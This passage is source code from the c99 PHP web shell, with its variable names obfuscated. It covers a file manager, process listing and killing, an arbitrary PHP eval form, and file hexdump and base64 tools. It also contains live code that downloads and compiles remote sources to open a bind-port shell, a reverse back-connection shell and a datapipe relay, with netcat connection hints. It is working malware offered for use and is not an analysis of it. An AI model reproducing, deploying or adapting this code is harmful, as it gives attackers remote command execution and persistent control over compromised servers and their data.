'act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;' . $sp85cee6; } else { $spa53ce4[] = '<a href="' . $sp8c8b96 . 'act=f&f=' . $sp3fed51 . '&ft=info&d=' . $spb26308 . '"><img src="' . $sp8c8b96 . 'act=img&img=ext_diz" alt="Info" height="16" width="16" border="0"></a>&nbsp;<a href="' . $sp8c8b96 . 'act=f&f=' . $sp3fed51 . '&ft=edit&d=' . $spb26308 . '"><img src="' . $sp8c8b96 . 'act=img&img=change" alt="Change" height="16" width="19" border="0"></a>&nbsp;<a href="' . $sp8c8b96 . 'act=f&f=' . $sp3fed51 . '&ft=download&d=' . $spb26308 . '"><img src="' . $sp8c8b96 . 'act=img&img=download" alt="Download" height="16" width="19" border="0"></a>&nbsp;' . $sp85cee6; } if ($spf60383 == '.' or $spf60383 == '..') { $sp0b0ef0['head'][] = $spa53ce4; } elseif (is_link($spe2ff4f)) { $sp0b0ef0['links'][] = $spa53ce4; } elseif (is_dir($spe2ff4f)) { $sp0b0ef0['folders'][] = $spa53ce4; } elseif (is_file($spe2ff4f)) { $sp0b0ef0['files'][] = $spa53ce4; } $sp6c3e91++; } } $sp4297b3 = array_merge($sp0b0ef0['cols'], $sp0b0ef0['head'], $sp0b0ef0['folders'], $sp0b0ef0['links'], $sp0b0ef0['files']); echo '<center><b>Listing folder (' . count($sp0b0ef0['files']) . ' files and ' . (count($sp0b0ef0['folders']) + count($sp0b0ef0['links'])) . ' folders):</b></center><br><TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#433333 border=0><form action="' . $sp8c8b96 . '" method=POST name="ls_form"><input type=hidden name=act value=' . $sp68666d . '><input type=hidden name=d value=' . $sp6bf0a4 . '>'; foreach ($sp4297b3 as $spa53ce4) { echo '<tr>
'; foreach ($spa53ce4 as $spe2ff4f) { echo '<td>' . $spe2ff4f . '</td>
'; } echo '</tr>
'; } echo '</table><hr size="1" noshade><p align="right">
  <script>
  function ls_setcheckboxall(status)
  {
   var id = 0;
   var num = ' . (count($sp4297b3) - 2) . ';
   while (id <= num)
   {
    document.getElementById(\'actbox\'+id).checked = status;
    id++;
   }
  }
  function ls_reverse_all()
  {
   var id = 0;
   var num = ' . (count($sp4297b3) - 2) . ';
   while (id <= num)
   {
    document.getElementById(\'actbox\'+id).checked = !document.getElementById(\'actbox\'+id).checked;
    id++;
   }
  }
  </script>
  <input type="button" onclick="ls_setcheckboxall(true);" value="Select all">&nbsp;&nbsp;<input type="button" onclick="ls_setcheckboxall(false);" value="Unselect all"> 
  <b><img src="' . $sp8c8b96 . 'act=img&img=arrow_ltr" border="0">'; if (count(array_merge($spc8cb58['copy'], $spc8cb58['cut'])) > 0 and $spe9e736) { echo '<input type=submit name=actarcbuff value="Pack buffer to archive">&nbsp;<input type="text" name="actarcbuff_path" value="archive_' . substr(md5(rand(1, 1000) . rand(1, 1000)), 0, 5) . '.tar.gz">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name="actpastebuff" value="Paste">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name="actemptybuff" value="Empty buffer">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'; } echo '<select name=act><option value="' . $spe3b8cc . '">With selected:</option>'; echo '<option value=delete' . ($sp68666d == 'delete' ? ' selected' : '') . '>Delete</option>'; echo '<option value=chmod' . ($sp68666d == 'chmod' ? ' selected' : '') . '>Change-mode</option>'; if ($spe9e736) { echo '<option value=cut' . ($sp68666d == 'cut' ? ' selected' : '') . '>Cut</option>'; echo '<option value=copy' . ($sp68666d == 'copy' ? ' selected' : '') . '>Copy</option>'; echo '<option value=unselect' . ($sp68666d == 'unselect' ? ' selected' : '') . '>Unselect</option>'; } echo '</select>&nbsp;<input type=submit value="Confirm"></p>'; echo '</form>'; } } if ($spe3b8cc == 'tools') { $sp277bed = array('c99sh_bindport.pl' => array('Using PERL', 'perl %path %port'), 'c99sh_bindport.c' => array('Using C', '%path %port %pass')); $sp697182 = array('c99sh_backconn.pl' => array('Using PERL', 'perl %path %host %port'), 'c99sh_backconn.c' => array('Using C', '%path %host %port')); $sp1859b4 = array('c99sh_datapipe.pl' => array('Using PERL', 'perl %path %localport %remotehost %remoteport'), 'c99sh_datapipe.c' => array('Using C', '%path %localport %remoteport %remotehost')); if (!is_array($spd2a1b6)) { $spd2a1b6 = array(); } if (!is_array($spf9630c)) { $spf9630c = array(); } if (!is_array($sp482637)) { $sp482637 = array(); } if (!is_numeric($spd2a1b6['port'])) { $spd2a1b6['port'] = $spa5241a; } if (empty($spd2a1b6['pass'])) { $spd2a1b6['pass'] = $spc34646; } if (empty($spf9630c['host'])) { $spf9630c['host'] = getenv('REMOTE_ADDR'); } if (!is_numeric($spf9630c['port'])) { $spf9630c['port'] = $speec795; } if (empty($sp482637['remoteaddr'])) { $sp482637['remoteaddr'] = 'irc.dalnet.ru:6667'; } if (!is_numeric($sp482637['localport'])) { $sp482637['localport'] = $sp36f23d; } if (!empty($spd23183)) { echo '<b>Result of binding port:</b><br>'; $spe2ff4f = $sp277bed[$spd2a1b6['src']]; if (empty($spe2ff4f)) { echo 'Unknown file!<br>'; } elseif (fsockopen(getenv('SERVER_ADDR'), $spd2a1b6['port'], $spfe6fb7, $sp2ea0cc, 0.1)) { echo 'Port alredy in use, select any other!<br>'; } else { $sp1cf12d = explode('.', $spd2a1b6['src']); $spe7e244 = $sp1cf12d[count($sp1cf12d) - 1]; unset($sp1cf12d[count($sp1cf12d) - 1]); $spdec1f1 = join('.', $sp1cf12d) . '.' . rand(0, 999) . '.' . $spe7e244; $spca16cb = $spbb76b1 . join('.', $sp1cf12d) . rand(0, 999); if ($spe7e244 == 'pl') { $spca16cb = $spdec1f1; } @unlink($spdec1f1); $sp694629 = fopen($spdec1f1, 'ab+'); if (!$sp694629) { echo 'Can\'t write sources to "' . $spdec1f1 . '"!<br>'; } elseif (!($spabbf84 = c99getsource($spd2a1b6['src']))) { echo 'Can\'t download sources!'; } else { fwrite($sp694629, $spabbf84, strlen($spabbf84)); fclose($sp694629); if ($spe7e244 == 'c') { $spc526a3 = myshellexec('gcc -o ' . $spca16cb . ' ' . $spdec1f1); @unlink($spdec1f1); } $spe2ff4f[1] = str_replace('%path', $spca16cb, $spe2ff4f[1]); $spe2ff4f[1] = str_replace('%port', $spd2a1b6['port'], $spe2ff4f[1]); $spe2ff4f[1] = str_replace('%pass', $spd2a1b6['pass'], $spe2ff4f[1]); $spe2ff4f[1] = str_replace('//', '/', $spe2ff4f[1]); $spc3a709 = myshellexec($spe2ff4f[1] . ' > /dev/null &'); sleep(5); $spfe78c5 = fsockopen('localhost', $spd2a1b6['port'], $spfe6fb7, $sp2ea0cc, 5); if (!$spfe78c5) { echo 'I can\'t connect to localhost:' . $spd2a1b6['port'] . '! I think you should configure your firewall.'; } else { echo 'Binding... ok! Connect to <b>' . getenv('SERVER_ADDR') . ':' . $spd2a1b6['port'] . '</b>! You should use NetCat&copy;, run "<b>nc -v ' . getenv('SERVER_ADDR') . ' ' . $spd2a1b6['port'] . '</b>"!<center><a href="' . $sp8c8b96 . 'act=processes&grep=' . basename($spca16cb) . '"><u>View binder\'s process</u></a></center>'; } } echo '<br>'; } } if (!empty($sp510a8a)) { echo '<b>Result of back connection:</b><br>'; $spe2ff4f = $sp697182[$spf9630c['src']]; if (empty($spe2ff4f)) { echo 'Unknown file!<br>'; } else { $sp1cf12d = explode('.', $spf9630c['src']); $spe7e244 = $sp1cf12d[count($sp1cf12d) - 1]; unset($sp1cf12d[count($sp1cf12d) - 1]); $spdec1f1 = join('.', $sp1cf12d) . '.' . rand(0, 999) . '.' . $spe7e244; $spca16cb = $spbb76b1 . join('.', $sp1cf12d) . rand(0, 999); if ($spe7e244 == 'pl') { $spca16cb = $spdec1f1; } @unlink($spdec1f1); $sp694629 = fopen($spdec1f1, 'ab+'); if (!$sp694629) { echo 'Can\'t write sources to "' . $spdec1f1 . '"!<br>'; } elseif (!($spabbf84 = c99getsource($spf9630c['src']))) { echo 'Can\'t download sources!'; } else { fwrite($sp694629, $spabbf84, strlen($spabbf84)); fclose($sp694629); if ($spe7e244 == 'c') { $spc526a3 = myshellexec('gcc -o ' . $spca16cb . ' ' . $spdec1f1); @unlink($spdec1f1); } $spe2ff4f[1] = str_replace('%path', $spca16cb, $spe2ff4f[1]); $spe2ff4f[1] = str_replace('%host', $spf9630c['host'], $spe2ff4f[1]); $spe2ff4f[1] = str_replace('%port', $spf9630c['port'], $spe2ff4f[1]); $spe2ff4f[1] = str_replace('//', '/', $spe2ff4f[1]); $spc3a709 = myshellexec($spe2ff4f[1] . ' > /dev/null &'); echo 'Now script try connect to ' . htmlspecialchars($spf9630c['host']) . ':' . htmlspecialchars($spf9630c['port']) . '...<br>'; } } } if (!empty($sp17cea3)) { echo '<b>Result of datapipe-running:</b><br>'; $spe2ff4f = $sp1859b4[$sp482637['src']]; if (empty($spe2ff4f)) { echo 'Unknown file!<br>'; } elseif (fsockopen(getenv('SERVER_ADDR'), $sp482637['port'], $spfe6fb7, $sp2ea0cc, 0.1)) { echo 'Port alredy in use, select any other!<br>'; } else { $spdec1f1 = $spbb76b1 . $sp482637['src']; $sp1cf12d = explode('.', $sp482637['src']); $spe7e244 = $sp1cf12d[count($sp1cf12d) - 1]; unset($sp1cf12d[count($sp1cf12d) - 1]); $spdec1f1 = join('.', $sp1cf12d) . '.' . rand(0, 999) . '.' . $spe7e244; $spca16cb = $spbb76b1 . join('.', $sp1cf12d) . rand(0, 999); if ($spe7e244 == 'pl') { $spca16cb = $spdec1f1; } @unlink($spdec1f1); $sp694629 = fopen($spdec1f1, 'ab+'); if (!$sp694629) { echo 'Can\'t write sources to "' . $spdec1f1 . '"!<br>'; } elseif (!($spabbf84 = c99getsource($sp482637['src']))) { echo 'Can\'t download sources!'; } else { fwrite($sp694629, $spabbf84, strlen($spabbf84)); fclose($sp694629); if ($spe7e244 == 'c') { $spc526a3 = myshellexec('gcc -o ' . $spca16cb . ' ' . $spdec1f1); @unlink($spdec1f1); } list($sp482637['remotehost'], $sp482637['remoteport']) = explode(':', $sp482637['remoteaddr']); $spe2ff4f[1] = str_replace('%path', $spca16cb, $spe2ff4f[1]); $spe2ff4f[1] = str_replace('%localport', $sp482637['localport'], $spe2ff4f[1]); $spe2ff4f[1] = str_replace('%remotehost', $sp482637['remotehost'], $spe2ff4f[1]); $spe2ff4f[1] = str_replace('%remoteport', $sp482637['remoteport'], $spe2ff4f[1]); $spe2ff4f[1] = str_replace('//', '/', $spe2ff4f[1]); $spc3a709 = myshellexec($spe2ff4f[1] . ' > /dev/null &'); sleep(5); $spfe78c5 = fsockopen('localhost', $sp482637['port'], $spfe6fb7, $sp2ea0cc, 5); if (!$spfe78c5) { echo 'I can\'t connect to localhost:' . $sp482637['localport'] . '! I think you should configure your firewall.'; } else { echo 'Running datapipe... ok! Connect to <b>' . getenv('SERVER_ADDR') . ':' . $sp482637['port'] . ', and you will connected to ' . $sp482637['remoteaddr'] . '</b>! You should use NetCat&copy;, run "<b>nc -v ' . getenv('SERVER_ADDR') . ' ' . $spd2a1b6['port'] . '</b>"!<center><a href="' . $sp8c8b96 . 'act=processes&grep=' . basename($spca16cb) . '"><u>View datapipe process</u></a></center>'; } } echo '<br>'; } } ?>
<b>Binding port:</b><br><form action="<?php  echo $sp8c8b96; ?>
"><input type=hidden name=act value=tools><input type=hidden name=d value="<?php  echo $sp6bf0a4; ?>
">Port: <input type=text name="bind[port]" value="<?php  echo htmlspecialchars($spd2a1b6['port']); ?>
">&nbsp;Password: <input type=text name="bind[pass]" value="<?php  echo htmlspecialchars($spd2a1b6['pass']); ?>
">&nbsp;<select name="bind[src]"><?php  foreach ($sp277bed as $sp71a197 => $spe2ff4f) { echo '<option value="' . $sp71a197 . '"'; if ($sp71a197 == $spd2a1b6['src']) { echo ' selected'; } echo '>' . $spe2ff4f[0] . '</option>'; } ?>
</select>&nbsp;<input type=submit name=bindsubmit value="Bind"></form>
<b>Back connection:</b><br><form action="<?php  echo $sp8c8b96; ?>
"><input type=hidden name=act value=tools><input type=hidden name=d value="<?php  echo $sp6bf0a4; ?>
">HOST: <input type=text name="bc[host]" value="<?php  echo htmlspecialchars($spf9630c['host']); ?>
">&nbsp;Port: <input type=text name="bc[port]" value="<?php  echo htmlspecialchars($spf9630c['port']); ?>
">&nbsp;<select name="bc[src]"><?php  foreach ($sp697182 as $sp71a197 => $spe2ff4f) { echo '<option value="' . $sp71a197 . '"'; if ($sp71a197 == $spf9630c['src']) { echo ' selected'; } echo '>' . $spe2ff4f[0] . '</option>'; } ?>
</select>&nbsp;<input type=submit name=bcsubmit value="Connect"></form>
Click "Connect" only after open port for it. You should use NetCat&copy;, run "<b>nc -l -n -v -p <?php  echo $speec795; ?>
</b>"!<br><br>
<b>Datapipe:</b><br><form action="<?php  echo $sp8c8b96; ?>
"><input type=hidden name=act value=tools><input type=hidden name=d value="<?php  echo $sp6bf0a4; ?>
">HOST: <input type=text name="datapipe[remoteaddr]" value="<?php  echo htmlspecialchars($sp482637['remoteaddr']); ?>
">&nbsp;Local port: <input type=text name="datapipe[localport]" value="<?php  echo htmlspecialchars($sp482637['localport']); ?>
">&nbsp;<select name="datapipe[src]"><?php  foreach ($sp1859b4 as $sp71a197 => $spe2ff4f) { echo '<option value="' . $sp71a197 . '"'; if ($sp71a197 == $spf9630c['src']) { echo ' selected'; } echo '>' . $spe2ff4f[0] . '</option>'; } ?>
</select>&nbsp;<input type=submit name=dpsubmit value="Run"></form><b>Note:</b> sources will be downloaded from remote server.<?php  } if ($spe3b8cc == 'processes') { echo '<b>Processes:</b><br>'; if (!$sp01e9c0) { $sp1eaa70 = 'ps -aux' . ($spd3541f ? ' | grep \'' . addslashes($spd3541f) . '\'' : ''); } else { $sp1eaa70 = 'tasklist'; } $spe6a02a = myshellexec($sp1eaa70); if (!$spe6a02a) { echo 'Can\'t execute "' . $sp1eaa70 . '"!'; } else { if (empty($sp5677bc)) { $sp5677bc = $sp952cfb; } $spc4a1aa = parsesort($sp5677bc); if (!is_numeric($spc4a1aa[0])) { $spc4a1aa[0] = 0; } $sp71a197 = $spc4a1aa[0]; if ($spc4a1aa[1] != 'a') { $sp08c43f = '<a href="' . $sp8c8b96 . 'act=' . $sp68666d . '&d=' . urlencode($sp6bf0a4) . '&processes_sort=' . $sp71a197 . 'a"><img src="' . $sp8c8b96 . 'act=img&img=sort_desc" height="9" width="14" border="0"></a>'; } else { $sp08c43f = '<a href="' . $sp8c8b96 . 'act=' . $sp68666d . '&d=' . urlencode($sp6bf0a4) . '&processes_sort=' . $sp71a197 . 'd"><img src="' . $sp8c8b96 . 'act=img&img=sort_asc" height="9" width="14" border="0"></a>'; } $spe6a02a = htmlspecialchars($spe6a02a); if (!$sp01e9c0) { if ($sp10b7e6) { if (is_null($sp055d57)) { $sp055d57 = 9; } echo 'Sending signal ' . $sp055d57 . ' to #' . $sp10b7e6 . '... '; if (posix_kill($sp10b7e6, $sp055d57)) { echo 'OK.'; } else { echo 'ERROR.'; } } while (preg_match('  ', $spe6a02a)) { $spe6a02a = str_replace('  ', ' ', $spe6a02a); } $sp355189 = explode('
', $spe6a02a); $sp9ee6bd = explode(' ', $sp355189[0]); unset($sp355189[0]); for ($sp6c3e91 = 0; $sp6c3e91 < count($sp9ee6bd); $sp6c3e91++) { if ($sp6c3e91 != $sp71a197) { $sp9ee6bd[$sp6c3e91] = '<a href="' . $sp8c8b96 . 'act=' . $sp68666d . '&d=' . urlencode($sp6bf0a4) . '&processes_sort=' . $sp6c3e91 . $spc4a1aa[1] . '"><b>' . $sp9ee6bd[$sp6c3e91] . '</b></a>'; } } $sp6d5ba2 = array(); foreach ($sp355189 as $sp91b79a) { if (!empty($sp91b79a)) { echo '<tr>'; $sp91b79a = explode(' ', $sp91b79a); $sp91b79a[10] = join(' ', array_slice($sp91b79a, 10)); $sp91b79a = array_slice($sp91b79a, 0, 11); if ($sp91b79a[0] == get_current_user()) { $sp91b79a[0] = '<font color=green>' . $sp91b79a[0] . '</font>'; } $sp91b79a[] = '<a href="' . $sp8c8b96 . 'act=processes&d=' . urlencode($sp6bf0a4) . '&pid=' . $sp91b79a[1] . '&sig=9"><u>KILL</u></a>'; $sp6d5ba2[] = $sp91b79a; echo '</tr>'; } } } else { while (preg_match('  ', $spe6a02a)) { $spe6a02a = str_replace('  ', '	', $spe6a02a); } while (preg_match('  ', $spe6a02a)) { $spe6a02a = str_replace('  ', '	', $spe6a02a); } while (preg_match('  ', $spe6a02a)) { $spe6a02a = str_replace('  ', '	', $spe6a02a); } while (preg_match('  ', $spe6a02a)) { $spe6a02a = str_replace('  ', '	', $spe6a02a); } while (preg_match('  ', $spe6a02a)) { $spe6a02a = str_replace('  ', '	', $spe6a02a); } while (preg_match('  ', $spe6a02a)) { $spe6a02a = str_replace('  ', '	', $spe6a02a); } while (preg_match('  ', $spe6a02a)) { $spe6a02a = str_replace('  ', '	', $spe6a02a); } while (preg_match('  ', $spe6a02a)) { $spe6a02a = str_replace('  ', '	', $spe6a02a); } while (preg_match('  ', $spe6a02a)) { $spe6a02a = str_replace('  ', '	', $spe6a02a); } while (preg_match('		', $spe6a02a)) { $spe6a02a = str_replace('		', '	', $spe6a02a); } while (preg_match('	 ', $spe6a02a)) { $spe6a02a = str_replace('	 ', '	', $spe6a02a); } $spe6a02a = convert_cyr_string($spe6a02a, 'd', 'w'); $sp355189 = explode('
', $spe6a02a); unset($sp355189[0], $sp355189[2]); $sp355189 = array_values($sp355189); $sp9ee6bd = explode('	', $sp355189[0]); $sp9ee6bd[1] = explode(' ', $sp9ee6bd[1]); $sp9ee6bd[1] = $sp9ee6bd[1][0]; $sp355189 = array_slice($sp355189, 1); unset($sp9ee6bd[2]); $sp9ee6bd = array_values($sp9ee6bd); if ($spc4a1aa[1] != 'a') { $sp08c43f = '<a href="' . $sp8c8b96 . 'act=' . $sp68666d . '&d=' . urlencode($sp6bf0a4) . '&processes_sort=' . $sp71a197 . 'a"><img src="' . $sp8c8b96 . 'act=img&img=sort_desc" height="9" width="14" border="0"></a>'; } else { $sp08c43f = '<a href="' . $sp8c8b96 . 'act=' . $sp68666d . '&d=' . urlencode($sp6bf0a4) . '&processes_sort=' . $sp71a197 . 'd"><img src="' . $sp8c8b96 . 'act=img&img=sort_asc" height="9" width="14" border="0"></a>'; } if ($sp71a197 > count($sp9ee6bd)) { $sp71a197 = count($sp9ee6bd) - 1; } for ($sp6c3e91 = 0; $sp6c3e91 < count($sp9ee6bd); $sp6c3e91++) { if ($sp6c3e91 != $sp71a197) { $sp9ee6bd[$sp6c3e91] = '<a href="' . $sp8c8b96 . 'act=' . $sp68666d . '&d=' . urlencode($sp6bf0a4) . '&processes_sort=' . $sp6c3e91 . $spc4a1aa[1] . '"><b>' . trim($sp9ee6bd[$sp6c3e91]) . '</b></a>'; } } $sp6d5ba2 = array(); foreach ($sp355189 as $sp91b79a) { if (!empty($sp91b79a)) { echo '<tr>'; $sp91b79a = explode('	', $sp91b79a); $sp91b79a[1] = intval($sp91b79a[1]); $sp91b79a[2] = $sp91b79a[3]; unset($sp91b79a[3]); $sp91b79a[2] = intval(str_replace(' ', '', $sp91b79a[2])) * 1024; $sp6d5ba2[] = $sp91b79a; echo '</tr>'; } } } $sp9ee6bd[$sp71a197] = '<b>' . $sp9ee6bd[$sp71a197] . '</b>' . $sp08c43f; $spe2ff4f = $sp5677bc[0]; usort($sp6d5ba2, 'tabsort'); if ($sp5677bc[1] == 'd') { $sp6d5ba2 = array_reverse($sp6d5ba2); } $sp0b0ef0 = array(); $sp0b0ef0[] = $sp9ee6bd; $sp0b0ef0 = array_merge($sp0b0ef0, $sp6d5ba2); echo '<TABLE height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0">'; foreach ($sp0b0ef0 as $sp6c3e91 => $sp71a197) { echo '<tr>'; foreach ($sp71a197 as $spc9281a => $spe2ff4f) { if ($sp01e9c0 and $sp6c3e91 > 0 and $spc9281a == 2) { $spe2ff4f = view_size($spe2ff4f); } echo '<td>' . $spe2ff4f . '</td>'; } echo '</tr>'; } echo '</table>'; } } if ($spe3b8cc == 'eval') { if (!empty($sp7fb3ff)) { echo '<b>Result of execution this PHP-code</b>:<br>'; $sped1c3a = ob_get_contents(); $sp0ec61f = realpath('.'); @chdir($sp6bf0a4); if ($sped1c3a) { ob_clean(); eval($sp7fb3ff); $spe6a02a = ob_get_contents(); $spe6a02a = convert_cyr_string($spe6a02a, 'd', 'w'); ob_clean(); echo $sped1c3a; if ($spe57ea8) { $spb7d784 = count(explode('
', $spe6a02a)) + 1; if ($spb7d784 < 10) { $spb7d784 = 10; } echo '<br><textarea cols="122" rows="' . $spb7d784 . '" readonly>' . htmlspecialchars($spe6a02a) . '</textarea>'; } else { echo $spe6a02a . '<br>'; } } else { if ($spe57ea8) { echo '<br><textarea cols="122" rows="15" readonly>'; eval($sp7fb3ff); echo '</textarea>'; } else { echo $spe6a02a; } } @chdir($sp0ec61f); } else { echo '<b>Execution PHP-code</b>'; if (empty($spe57ea8)) { $spe57ea8 = true; } } echo '<form action="' . $sp8c8b96 . '" method=POST><input type=hidden name=act value=eval><textarea name="eval" cols="122" rows="10">' . htmlspecialchars($sp7fb3ff) . '</textarea><input type=hidden name="d" value="' . $sp67e5dd . '"><br><br><input type=submit value="Execute">&nbsp;Display in text-area&nbsp;<input type="checkbox" name="eval_txt" value="1"'; if ($spe57ea8) { echo ' checked'; } echo '></form>'; } if ($spe3b8cc == 'f') { if ((!is_readable($sp6bf0a4 . $sp224638) or is_dir($sp6bf0a4 . $sp224638)) and $spd19b50 != 'edit') { if (file_exists($sp6bf0a4 . $sp224638)) { echo '<center><b>Permision denied (' . htmlspecialchars($sp6bf0a4 . $sp224638) . ')!</b></center>'; } else { echo '<center><b>File does not exists (' . htmlspecialchars($sp6bf0a4 . $sp224638) . ')!</b><br><a href="' . $sp8c8b96 . 'act=f&f=' . urlencode($sp224638) . '&ft=edit&d=' . urlencode($sp6bf0a4) . '&c=1"><u>Create</u></a></center>'; } } else { $spd6dd63 = @file_get_contents($sp6bf0a4 . $sp224638); $spe7e244 = explode('.', $sp224638); $sp76d016 = count($spe7e244) - 1; $spe7e244 = $spe7e244[$sp76d016]; $spe7e244 = strtolower($spe7e244); $sp0a0cd5 = ''; foreach ($spde4c45 as $sp71a197 => $spe2ff4f) { if (in_array($spe7e244, $spe2ff4f)) { $sp0a0cd5 = $sp71a197; break; } } if (preg_match('sess_(.*)', $sp224638)) { $sp0a0cd5 = 'phpsess'; } if (empty($spd19b50)) { $spd19b50 = $sp0a0cd5; } $sp662a5a = array(array('<img src="' . $sp8c8b96 . 'act=img&img=ext_diz" border="0">', 'info'), array('<img src="' . $sp8c8b96 . 'act=img&img=ext_html" border="0">', 'html'), array('<img src="' . $sp8c8b96 . 'act=img&img=ext_txt" border="0">', 'txt'), array('Code', 'code'), array('Session', 'phpsess'), array('<img src="' . $sp8c8b96 . 'act=img&img=ext_exe" border="0">', 'exe'), array('SDB', 'sdb'), array('<img src="' . $sp8c8b96 . 'act=img&img=ext_gif" border="0">', 'img'), array('<img src="' . $sp8c8b96 . 'act=img&img=ext_ini" border="0">', 'ini'), array('<img src="' . $sp8c8b96 . 'act=img&img=download" border="0">', 'download'), array('<img src="' . $sp8c8b96 . 'act=img&img=ext_rtf" border="0">', 'notepad'), array('<img src="' . $sp8c8b96 . 'act=img&img=change" border="0">', 'edit')); echo '<b>Viewing file:&nbsp;&nbsp;&nbsp;&nbsp;<img src="' . $sp8c8b96 . 'act=img&img=ext_' . $spe7e244 . '" border="0">&nbsp;' . $sp224638 . ' (' . view_size(filesize($sp6bf0a4 . $sp224638)) . ') &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' . view_perms_color($sp6bf0a4 . $sp224638) . '</b><br>Select action/file-type:<br>'; foreach ($sp662a5a as $spbcfcd6) { if ($spbcfcd6[1] == $sp0a0cd5) { echo ' <a href="' . $sp8c8b96 . 'act=f&f=' . urlencode($sp224638) . '&ft=' . $spbcfcd6[1] . '&d=' . urlencode($sp6bf0a4) . '"><font color=green>' . $spbcfcd6[0] . '</font></a>'; } elseif ($spbcfcd6[1] == $spd19b50) { echo ' <a href="' . $sp8c8b96 . 'act=f&f=' . urlencode($sp224638) . '&ft=' . $spbcfcd6[1] . '&d=' . urlencode($sp6bf0a4) . '"><b><u>' . $spbcfcd6[0] . '</u></b></a>'; } else { echo ' <a href="' . $sp8c8b96 . 'act=f&f=' . urlencode($sp224638) . '&ft=' . $spbcfcd6[1] . '&d=' . urlencode($sp6bf0a4) . '"><b>' . $spbcfcd6[0] . '</b></a>'; } echo ' (<a href="' . $sp8c8b96 . 'act=f&f=' . urlencode($sp224638) . '&ft=' . $spbcfcd6[1] . '&white=1&d=' . urlencode($sp6bf0a4) . '" target="_blank">+</a>) |'; } echo '<hr size="1" noshade>'; if ($spd19b50 == 'info') { echo '<b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr><td><b>Path</b></td><td> ' . $sp6bf0a4 . $sp224638 . '</td></tr><tr><td><b>Size</b></td><td> ' . view_size(filesize($sp6bf0a4 . $sp224638)) . '</td></tr><tr><td><b>MD5</b></td><td> ' . md5_file($sp6bf0a4 . $sp224638) . '</td></tr>'; if (!$sp01e9c0) { echo '<tr><td><b>Owner/Group</b></td><td> '; $spc936c1 = posix_getpwuid(fileowner($sp6bf0a4 . $sp224638)); $spdd067c = posix_getgrgid(filegroup($sp6bf0a4 . $sp224638)); echo ($spc936c1['name'] ? $spc936c1['name'] : fileowner($sp6bf0a4 . $sp224638)) . '/' . ($spdd067c['name'] ? $spdd067c['name'] : filegroup($sp6bf0a4 . $sp224638)); } echo '<tr><td><b>Perms</b></td><td><a href="' . $sp8c8b96 . 'act=chmod&f=' . urlencode($sp224638) . '&d=' . urlencode($sp6bf0a4) . '">' . view_perms_color($sp6bf0a4 . $sp224638) . '</a></td></tr><tr><td><b>Create time</b></td><td> ' . date('d/m/Y H:i:s', filectime($sp6bf0a4 . $sp224638)) . '</td></tr><tr><td><b>Access time</b></td><td> ' . date('d/m/Y H:i:s', fileatime($sp6bf0a4 . $sp224638)) . '</td></tr><tr><td><b>MODIFY time</b></td><td> ' . date('d/m/Y H:i:s', filemtime($sp6bf0a4 . $sp224638)) . '</td></tr></table><br>'; $spa14030 = fopen($sp6bf0a4 . $sp224638, 'rb'); if ($spa14030) { if ($sp70a59b) { echo '<b>FULL HEXDUMP</b>'; $sp6ff357 = fread($spa14030, filesize($sp6bf0a4 . $sp224638)); } else { echo '<b>HEXDUMP PREVIEW</b>'; $sp6ff357 = fread($spa14030, $sp292a78 * $sp8f9868); } $sp9728ca = 0; $sp9881d6 = '00000000<br>'; $sp733f74 = ''; $spfd8897 = ''; for ($sp6c3e91 = 0; $sp6c3e91 < strlen($sp6ff357); $sp6c3e91++) { $sp733f74 .= sprintf('%02X', ord($sp6ff357[$sp6c3e91])) . ' '; switch (ord($sp6ff357[$sp6c3e91])) { case 0: $spfd8897 .= '<font>0</font>'; break; case 32: case 10: case 13: $spfd8897 .= '&nbsp;'; break; default: $spfd8897 .= htmlspecialchars($sp6ff357[$sp6c3e91]); } $sp9728ca++; if ($sp9728ca == $sp8f9868) { $sp9728ca = 0; if ($sp6c3e91 + 1 < strlen($sp6ff357)) { $sp9881d6 .= sprintf('%08X', $sp6c3e91 + 1) . '<br>'; } $sp733f74 .= '<br>'; $spfd8897 .= '<br>'; } } echo '<table border=0 bgcolor=#666666 cellspacing=1 cellpadding=4><tr><td bgcolor=#666666>' . $sp9881d6 . '</td><td bgcolor=000000>' . $sp733f74 . '</td><td bgcolor=000000>' . $spfd8897 . '</td></tr></table><br>'; } $spbf8204 = ''; if ($sp7a8f5b == 1) { echo '<b>Base64 Encode</b><br>'; $spbf8204 = base64_encode(file_get_contents($sp6bf0a4 . $sp224638)); } elseif ($sp7a8f5b == 2) { echo '<b>Base64 Encode + Chunk</b><br>'; $spbf8204 = chunk_split(base64_encode(file_get_contents($sp6bf0a4 . $sp224638))); } elseif ($sp7a8f5b == 3) { echo '<b>Base64 Encode + Chunk + Quotes</b><br>'; $spbf8204 = base64_encode(file_get_contents($sp6bf0a4 . $sp224638)); $spbf8204 = substr(preg_replace('!.{1,76}!', '\'\\0\'.
', $spbf8204), 0, -2); } elseif ($sp7a8f5b == 4) { $sp2583e7 = file_get_contents($sp6bf0a4 . $sp224638); $spbf8204 = base64_decode($sp2583e7); echo '<b>Base64 Decode'; if (base64_encode($spbf8204) != $sp2583e7) { echo ' (failed)'; } echo '</b><br>'; } if (!empty($spbf8204)) { echo '<textarea cols=80 rows=10>' . htmlspecialchars($spbf8204) . '</textarea><br><br>'; } echo '<b>HEXDUMP:</b><nobr> [<a href="' . $sp8c8b96 . 'act=f&f=' . urlencode($sp224638) . '&ft=info&fullhexdump=1&d=' . urlencode($sp6bf0a4) . '">Full</a>] [<a href="' . $sp8c8b96 . 'act=f&f=' . urlencode($sp224638) . '&ft=info&d=' . urlencode($sp6bf0a4) . '">Preview</a>]<br><b>Base64: </b>
<nobr>[<a href="' . $sp8c8b96 . 'act=f&f=' . urlencode($sp224638) . '&ft=info&base64=1&d=' . urlencode($sp6bf0a4) . '">Encode</a>]&nbsp;</nobr>
<nobr>[<a href="' . $sp8c8b96 . 'act=f&f=' . urlencode($sp224638) . '&ft=info&base64=2&d=' . urlencode($sp6bf0a4) . '">+chunk</a>]&nbsp;</nobr>
